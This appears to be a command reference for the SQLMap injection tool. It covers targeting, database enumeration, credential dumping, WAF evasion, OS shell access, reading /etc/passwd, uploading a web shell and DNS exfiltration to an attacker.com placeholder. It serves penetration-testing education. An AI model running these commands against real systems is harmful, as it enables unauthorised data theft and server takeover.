## What is SQLMap?

SQLMap is an open-source, automated SQL injection detection and exploitation tool. It supports a wide range of databases and injection techniques, and can automate the entire process of detecting vulnerabilities, extracting data, and even gaining operating system access in some cases.

**Supported Databases:**

- MySQL / MariaDB
- PostgreSQL
- Microsoft SQL Server
- Oracle
- SQLite
- IBM DB2
- Firebird
- Sybase
- SAP MaxDB
- HSQLDB
- H2
- Informix

---

## Installation

### Linux / macOS

```bash
# Clone from GitHub
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev
cd sqlmap-dev
python3 sqlmap.py --version

# Or via pip
pip install sqlmap
```

### Windows

```powershell
# Download and run with Python
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python sqlmap.py --version
```

### Kali Linux (pre-installed)

```bash
sqlmap --version
# Update
sudo apt update && sudo apt install sqlmap
```

---

## Core Concepts

### Injection Types

|Code|Name|Description|
|---|---|---|
|`B`|Boolean-based blind|Infers data via true/false responses|
|`E`|Error-based|Extracts data from database error messages|
|`U`|Union-based|Uses UNION SELECT to retrieve data|
|`S`|Stacked queries|Executes multiple statements|
|`T`|Time-based blind|Infers data via response timing (e.g., `SLEEP()`)|
|`Q`|Inline queries|Subquery-based injection|

### Risk & Level

- **`--level`** (1–5): Controls the depth of tests. Higher = more payloads tested, more requests made.
- **`--risk`** (1–3): Controls the potential harmfulness of payloads. Higher = more aggressive tests (e.g., `UPDATE` statements at risk 3).

Default: `--level 1 --risk 1`

---

## Basic Usage

```bash
# Test a URL parameter
sqlmap -u "http://target.com/page?id=1"

# Test with verbosity
sqlmap -u "http://target.com/page?id=1" -v 3

# Test and extract all databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Batch mode (auto-answer all prompts)
sqlmap -u "http://target.com/page?id=1" --batch
```

---

## Target Specification

### URL Target

```bash
sqlmap -u "http://target.com/page?id=1&cat=2"
```

### Specific Parameter

```bash
# Test only the 'id' parameter
sqlmap -u "http://target.com/page?id=1&cat=2" -p id
```

### POST Request

```bash
sqlmap -u "http://target.com/login" --data="username=admin&password=test"
```

### From Burp/ZAP Request File

```bash
# Save a raw HTTP request from Burp Suite as req.txt
sqlmap -r req.txt
```

### From a List of URLs

```bash
sqlmap -m urls.txt
```

### Crawl a Target

```bash
sqlmap -u "http://target.com" --crawl=2
```

### Target a Specific Form

```bash
sqlmap -u "http://target.com/page" --forms
```

---

## Request Configuration

### Headers

```bash
# Custom User-Agent
sqlmap -u "URL" --user-agent="Mozilla/5.0 ..."

# Random User-Agent
sqlmap -u "URL" --random-agent

# Custom header
sqlmap -u "URL" --headers="X-Forwarded-For: 127.0.0.1\nCustom-Header: value"

# Referer
sqlmap -u "URL" --referer="http://google.com"
```

### Cookies

```bash
# Pass a session cookie
sqlmap -u "URL" --cookie="PHPSESSID=abc123; security=low"

# Test cookie parameters for injection
sqlmap -u "URL" --cookie="id=1" --level=2
```

### HTTP Methods

```bash
# Force GET or POST
sqlmap -u "URL" --method=PUT

# PUT with data
sqlmap -u "URL" --method=PUT --data='{"id":1}'
```

### Proxy

```bash
# Route through Burp Suite
sqlmap -u "URL" --proxy="http://127.0.0.1:8080"

# With authentication
sqlmap -u "URL" --proxy="http://user:pass@127.0.0.1:8080"

# Ignore SSL errors
sqlmap -u "URL" --ignore-code=401
```

### Delays & Timeouts

```bash
# Delay between requests (seconds)
sqlmap -u "URL" --delay=1

# Connection timeout
sqlmap -u "URL" --timeout=30

# Retries on connection failure
sqlmap -u "URL" --retries=5
```

---

## Injection Techniques

```bash
# Test only specific techniques (e.g., Union + Error)
sqlmap -u "URL" --technique=UE

# Time-based blind only
sqlmap -u "URL" --technique=T

# All techniques (default)
sqlmap -u "URL" --technique=BEUSTQ

# Time delay for time-based blind (seconds)
sqlmap -u "URL" --time-sec=5
```

### Second-Order Injection

```bash
# Inject into one URL, trigger at another
sqlmap -u "http://target.com/register" --data="user=test" \
  --second-url="http://target.com/profile"
```

---

## Database Enumeration

### List Databases

```bash
sqlmap -u "URL" --dbs
```

### List Tables in a Database

```bash
sqlmap -u "URL" -D database_name --tables
```

### List Columns in a Table

```bash
sqlmap -u "URL" -D database_name -T table_name --columns
```

### Get Row Count

```bash
sqlmap -u "URL" -D db -T table --count
```

### Database Fingerprint

```bash
sqlmap -u "URL" --banner      # DB version banner
sqlmap -u "URL" --current-db  # Current database
sqlmap -u "URL" --current-user # Current DB user
sqlmap -u "URL" --is-dba      # Check if user is DBA
sqlmap -u "URL" --users       # List all DB users
sqlmap -u "URL" --passwords   # Dump user password hashes
sqlmap -u "URL" --privileges  # List user privileges
sqlmap -u "URL" --roles       # List user roles (Oracle)
```

---

## Data Extraction

### Dump a Table

```bash
sqlmap -u "URL" -D db_name -T table_name --dump
```

### Dump Specific Columns

```bash
sqlmap -u "URL" -D db_name -T users -C "username,password" --dump
```

### Dump with Row Filtering

```bash
# Limit rows
sqlmap -u "URL" -D db -T users --dump --start=1 --stop=10

# WHERE condition
sqlmap -u "URL" -D db -T users --dump --where="id > 5"
```

### Dump All Databases

```bash
sqlmap -u "URL" --dump-all

# Exclude system databases
sqlmap -u "URL" --dump-all --exclude-sysdbs
```

### Search

```bash
# Search for a column name across all tables
sqlmap -u "URL" --search -C password

# Search for a table name
sqlmap -u "URL" --search -T users

# Search for a database name
sqlmap -u "URL" --search -D customer
```

---

## Authentication & Sessions

### HTTP Basic Auth

```bash
sqlmap -u "URL" --auth-type=Basic --auth-cred="admin:password"
```

### Digest Auth

```bash
sqlmap -u "URL" --auth-type=Digest --auth-cred="user:pass"
```

### NTLM Auth

```bash
sqlmap -u "URL" --auth-type=NTLM --auth-cred="DOMAIN\user:pass"
```

### Login Form (cookie-based)

```bash
# Login first, grab the session cookie, then test
sqlmap -u "http://target.com/protected" --cookie="session=TOKEN"

# Or use --csrf-token for CSRF-protected forms
sqlmap -u "http://target.com/login" \
  --data="user=admin&pass=test&csrf=TOKEN" \
  --csrf-token=csrf \
  --csrf-url="http://target.com/login"
```

---

## Evasion & Tampering

### Tamper Scripts

Tamper scripts modify payloads to bypass WAFs and filters.

```bash
# Use a single tamper script
sqlmap -u "URL" --tamper=space2comment

# Chain multiple tamper scripts
sqlmap -u "URL" --tamper="between,randomcase,space2comment"
```

**Commonly Used Tamper Scripts:**

|Script|Effect|
|---|---|
|`space2comment`|Replaces spaces with `/**/`|
|`randomcase`|Randomizes letter casing (`SeLeCt`)|
|`between`|Replaces `>` with `NOT BETWEEN 0 AND`|
|`charencode`|URL-encodes characters|
|`chardoubleencode`|Double URL-encodes|
|`base64encode`|Base64-encodes the payload|
|`htmlencode`|HTML-encodes special characters|
|`apostrophemask`|Replaces apostrophes with UTF-8 fullwidth|
|`equaltolike`|Replaces `=` with `LIKE`|
|`modsecurityversioned`|Wraps with versioned comment (MySQL)|
|`unmagicquotes`|Bypasses magic quotes with multi-byte chars|
|`0x2char`|Converts strings to hex literals|

```bash
# List all available tamper scripts
sqlmap --list-tampers
```

### WAF Evasion Options

```bash
# Randomize parameter order
sqlmap -u "URL" --randomize=id

# Add random junk parameters
sqlmap -u "URL" --eval="import random; id=random.randint(1,99)"

# Skip URL encoding
sqlmap -u "URL" --skip-urlencode

# Use chunked transfer encoding
sqlmap -u "URL" --chunked

# HTTP parameter pollution
sqlmap -u "URL" --hpp
```

---

## Advanced Features

### OS Command Execution

Requires DBA privileges on the DB user.

```bash
# Execute a single OS command
sqlmap -u "URL" --os-cmd="whoami"

# Interactive OS shell
sqlmap -u "URL" --os-shell
```

### File System Access

```bash
# Read a file from the server
sqlmap -u "URL" --file-read="/etc/passwd"

# Write a file to the server
sqlmap -u "URL" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
```

### SQL Shell

```bash
# Interactive SQL prompt
sqlmap -u "URL" --sql-shell

# Execute a single SQL statement
sqlmap -u "URL" --sql-query="SELECT version()"
```

### DNS Exfiltration (Out-of-Band)

```bash
# Requires a controlled DNS server
sqlmap -u "URL" --dns-domain=attacker.com
```

### Stored Procedure Abuse (MSSQL)

```bash
sqlmap -u "URL" --os-pwn     # Meterpreter/VNC
sqlmap -u "URL" --priv-esc   # Attempt privilege escalation
```

---

## Output & Logging

### Verbosity Levels

|Level|Description|
|---|---|
|0|Show only Python tracebacks|
|1|Show info and warning messages (default)|
|2|Show debug messages|
|3|Show HTTP traffic|
|4|Show HTTP requests|
|5|Show HTTP responses|
|6|Show HTTP response pages|

```bash
sqlmap -u "URL" -v 3
```

### Output Directory

```bash
# Save results to a specific directory
sqlmap -u "URL" --output-dir=/tmp/sqlmap_results
```

### Logging

```bash
# Save all HTTP traffic to a file
sqlmap -u "URL" --traffic-file=traffic.log

# Save all requests to file
sqlmap -u "URL" --har=output.har

# Flush session (start fresh, ignore cached results)
sqlmap -u "URL" --flush-session

# Purge all SQLMap data for a target
sqlmap -u "URL" --purge
```

---

## Common Workflows

### 1. Quick Vulnerability Check

```bash
sqlmap -u "http://target.com/page?id=1" --batch --level=2 --risk=1
```

### 2. Full Enumeration from a Burp Request

```bash
sqlmap -r burp_request.txt --batch --dbs
sqlmap -r burp_request.txt -D target_db --tables
sqlmap -r burp_request.txt -D target_db -T users --columns
sqlmap -r burp_request.txt -D target_db -T users -C "username,password" --dump
```

### 3. POST Login Form with CSRF

```bash
sqlmap -u "http://target.com/login" \
  --data="user=admin&pass=test&_token=abc" \
  --csrf-token=_token \
  --csrf-url="http://target.com/login" \
  --batch --level=3
```

### 4. WAF Bypass with Tamper Scripts

```bash
sqlmap -u "http://target.com/page?id=1" \
  --tamper="between,randomcase,space2comment" \
  --random-agent \
  --delay=2 \
  --level=3 --risk=2 \
  --batch --dbs
```

### 5. Automated Crawl and Test

```bash
sqlmap -u "http://target.com" \
  --crawl=3 \
  --forms \
  --batch \
  --level=2 \
  --output-dir=./results
```

### 6. Extract Data with Rate Limiting

```bash
sqlmap -u "http://target.com/page?id=1" \
  -D mydb -T users --dump \
  --delay=2 \
  --retries=3 \
  --timeout=30 \
  --batch
```

---

## Flags Quick Reference

### Target

|Flag|Description|
|---|---|
|`-u URL`|Target URL|
|`-r FILE`|Load request from file|
|`-m FILE`|Scan multiple URLs from file|
|`-g DORK`|Use Google dork as targets|
|`--data=DATA`|POST data string|
|`-p PARAM`|Test specific parameter(s)|
|`--forms`|Auto-detect and test forms|
|`--crawl=DEPTH`|Crawl site to given depth|

### Detection

|Flag|Description|
|---|---|
|`--level=N`|Test level (1–5)|
|`--risk=N`|Risk level (1–3)|
|`--technique=T`|Injection technique(s)|
|`--dbms=DB`|Force database type|
|`--os=OS`|Force operating system|
|`--time-sec=N`|Time delay for time-based|

### Enumeration

| Flag         | Description                |
| ------------ | -------------------------- |
| `--dbs`      | List databases             |
| `-D DB`      | Target database            |
| `--tables`   | List tables                |
| `-T TABLE`   | Target table               |
| `--columns`  | List columns               |
| `-C COL,COL` | Target columns             |
| `--dump`     | Dump data                  |
| `--dump-all` | Dump all databases         |
| `--count`    | Count rows                 |
| `--search`   | Search for DB/table/column |
| -a, --all    | Retrieve everything        |
### Fingerprinting

|Flag|Description|
|---|---|
|`--banner`|Database version banner|
|`--current-db`|Current database|
|`--current-user`|Current DB user|
|`--is-dba`|Check DBA privileges|
|`--users`|All DB users|
|`--passwords`|User password hashes|
|`--privileges`|User privileges|

### Request

|Flag|Description|
|---|---|
|`--cookie=COOKIE`|HTTP cookie|
|`--headers=H`|Extra HTTP headers|
|`--user-agent=UA`|Custom User-Agent|
|`--random-agent`|Random User-Agent|
|`--proxy=URL`|HTTP proxy|
|`--delay=N`|Delay between requests|
|`--timeout=N`|Request timeout|
|`--retries=N`|Retry count|

### Evasion

|Flag|Description|
|---|---|
|`--tamper=SCRIPT`|Tamper script(s)|
|`--random-agent`|Randomize User-Agent|
|`--hpp`|HTTP parameter pollution|
|`--chunked`|Chunked transfer encoding|
|`--skip-urlencode`|Skip URL encoding|

### Advanced

|Flag|Description|
|---|---|
|`--os-shell`|Interactive OS shell|
|`--os-cmd=CMD`|Execute OS command|
|`--sql-shell`|Interactive SQL shell|
|`--file-read=PATH`|Read file from server|
|`--file-write=F`|Upload file to server|
|`--dns-domain=D`|DNS exfiltration domain|

### Output

|Flag|Description|
|---|---|
|`-v N`|Verbosity level (0–6)|
|`--batch`|Non-interactive mode|
|`--output-dir=DIR`|Output directory|
|`--flush-session`|Clear cached session|
|`--answers=ANS`|Pre-answer prompts|

---

## Tips & Best Practices

- Always start with `--level=1 --risk=1` and increase only if needed.
- Use `--batch` in automated scripts to avoid interactive prompts.
- Use `-r` with Burp Suite requests to preserve exact headers and cookies.
- Use `--flush-session` when retesting a target after making changes.
- Combine `--random-agent` and `--delay` to reduce detection likelihood.
- Use `--technique=T` (time-based) when the target returns identical responses for true/false (fully blind scenarios).
- Test in a lab environment (e.g., DVWA, bWAPP, HackTheBox) to learn safely.

---

_SQLMap version: 1.8.x | Documentation reflects current stable release behaviour._